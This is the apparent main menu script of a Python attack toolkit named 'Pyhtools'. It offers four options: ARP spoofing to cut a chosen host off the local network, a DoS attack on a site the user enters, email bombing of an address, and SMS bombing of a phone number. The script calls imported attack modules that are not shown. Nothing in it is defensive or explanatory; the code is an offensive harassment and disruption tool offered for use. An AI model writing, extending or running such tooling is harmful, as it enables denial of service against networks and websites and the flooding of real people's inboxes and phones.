from modulesTools import dos, arp
from modulesTools.emailBomb import EmBomb
from modulesTools.smsBomb import SmsBomber
import os,  sys, time
import threading


Green = '\033[92m'
Blue = '\033[94m'
Grey = '\033[0m'
Red = '\033[31m'
White = '\33[97m'
Yellow = '\33[93m'

# BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def banner():
    print(Green + '''
              .__     __                .__          
______ ___.__.|  |___/  |_  ____   ____ |  |   ______
\____ <   |  ||  |  \   __\/  _ \ /  _ \|  |  /  ___/
|  |_> >___  ||   Y  \  | (  <_> |  <_> )  |__\___ \ 
|   __// ____||___|  /__|  \____/ \____/|____/____  >
|__|   \/          \/                             \/ 

    ''' + 'Author: T1009\tEmail: 504733997@qq.com\n' + Grey)


def choice():
    print(Yellow + 'Choice Menu:\n' + Grey)
    print('     1. ARP disconnection')
    print('     2. DoS attack')
    print('     3. Email bomb')
    print('     4. SmS bomb')
    print('\n     E. Exit\n')

# 扫描动画
def scanningAnimation(text):
    try:
        global stopAnimation
        i = 0
        while stopAnimation is not True:
            tempText = list(text)
            if i >= len(tempText):
                i = 0
            tempText[i] = tempText[i].upper()
            tempText = ''.join(tempText)
            sys.stdout.write(Green + tempText + '\r' + Grey)
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    except:
        os._exit(1)


# e.g. Pyhtool>
def header(name):
    return '{}{}{}> {}'.format(Blue, name, White, Grey)


def shutdown():
    print(Green + '\n[!] Thank you for your use!' + Grey)


def ValidInput():
    print(Red + '[!] Valid Input!' + Grey)


if __name__ == '__main__':

    while True:
        os.system('cls || clear')
        banner()
        choice()

        try:
            c = input(header('Pyhtools'))
            if c == '1':
                global stopAnimation
                stopAnimation  = False
                t = threading.Thread(target=scanningAnimation, args=('Scanning your network, hang on...',))
                t.daemon = True
                t.start()

                try:
                    hostlist = arp.onlineIp()
                except KeyboardInterrupt:
                    shutdown()
                
                stopAnimation = True

                print('\n')
                print(Green + 'OnLineIp: ' + Grey + '\n')
                for i in range(len(hostlist)):
                    print('     [{}{}{}]: {}\t\t{}'.format(Yellow, i, Grey, hostlist[i][0], hostlist[i][1]))
                
                try:
                    target = int(input('\n' + header('ArpAttack')))
                    pkt = int(input('\n' + header('ArpAttack pkt'))) # 每秒发送的包

                    _, my_mac = arp.getMyIp_Mac()
                    gateway_ip, _ = arp.getGateWayIp_Mac()
                    target_ip, target_mac = hostlist[target][0], hostlist[target][1]

                    print(Green + 'Spoofing started...' + Grey)

                    arp.arpAttack(my_mac, gateway_ip, target_ip, target_mac, pkt)

                except KeyboardInterrupt:
                    sys.stdout.write(Red + '[!] Keyboard Interrupt !' + Grey)
                    time.sleep(1)

                except (ValueError, IndexError):
                    sys.stdout.write(Red + '[!] valid input, exit !' + Grey)
                    time.sleep(1)

            elif c == '2':
                site = input(header('Site'))
                DosAttack = dos.DOS(site)
                try:
                    DosAttack.start_attack()
                except KeyboardInterrupt:
                    sys.stdout.write(Red + '[!] Keyboard Interrupt !' + Grey)
                    time.sleep(1)

            elif c == '3':
                # To, Subject='Hello', Content='Are you ok?'
                flag = True
                while flag:
                    try:
                        To = input(header('To(e.g. 123@qq.com)'))
                        Subject = input(header('Subject(e.g. Hello)'))
                        Content = input(header('Content(e.g. Are you ok?'))
                        number = int(input(header('e.g. 10')))
                        EmBomb(To, Subject, Content).emAttack(number)  
                        flag = False          
                    except ValueError:
                        sys.stdout.write(Red + 'Error!\n' + Grey)
                        time.sleep(1)
                        banner()
                        choice()
                        sys.stdout.write(Yellow + 'Email bomb:\n' + Grey)
                    except KeyboardInterrupt:
                        flag = False
                        sys.stdout.write(Red + '[!] Keyboard Interrupt !' + Grey)
                        time.sleep(1)
                        
                        

            elif c == '4':
                try:
                    phone = input(header('PhoneNumber'))
                    SmsBomber(phone).send()
                except KeyboardInterrupt:
                    sys.stdout.write(Red + '[!] Keyboard Interrupt!' + Grey)
                    time.sleep(1)
                except:
                    sys.stdout.write(Red + '[!] Valid Input!' + Grey)
                    time.sleep(1)
                

            elif c.lower() == 'e':
                shutdown()
                os._exit(0)
            
            else:
                sys.stdout.write(Red + '[!] Valid Input!' + Grey)
                time.sleep(1)

        except KeyboardInterrupt:
            shutdown()
            os._exit(0)
